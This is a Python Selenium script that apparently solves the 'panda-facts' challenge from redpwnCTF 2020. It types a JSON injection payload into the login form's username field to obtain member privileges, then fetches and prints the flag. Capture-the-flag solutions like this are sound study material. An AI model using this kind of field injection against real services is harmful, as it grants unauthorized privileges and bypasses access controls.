import re

from selenium.webdriver import Firefox
from selenium.webdriver.firefox.options import Options


# Configure selenium options
opts = Options()
opts.headless = True
driver = Firefox(options=opts)

try:

    # Submit login form with payload
    driver.get("https://panda-facts.2020.redpwnc.tf/")
    textarea = driver.find_element_by_id("username")
    textarea.clear()
    payload = '", "member": 1, "username": "tgihf'
    textarea.send_keys(payload)

    button = driver.find_element_by_xpath("/html/body/div/form/input[@value='Enter']")
    button.click()

    # Retrieve the flag
    button = driver.find_element_by_id("flag")
    button.click()

    driver.get("https://panda-facts.2020.redpwnc.tf/api/flag")
    regex = r"flag{(.+)}"
    result = re.search(regex, driver.page_source)
    assert result, "[!] The flag wasn't in the page source"
    flag: str = result.group(0)
    print(f"[*] Got the flag: {flag}")
finally:
    driver.quit()
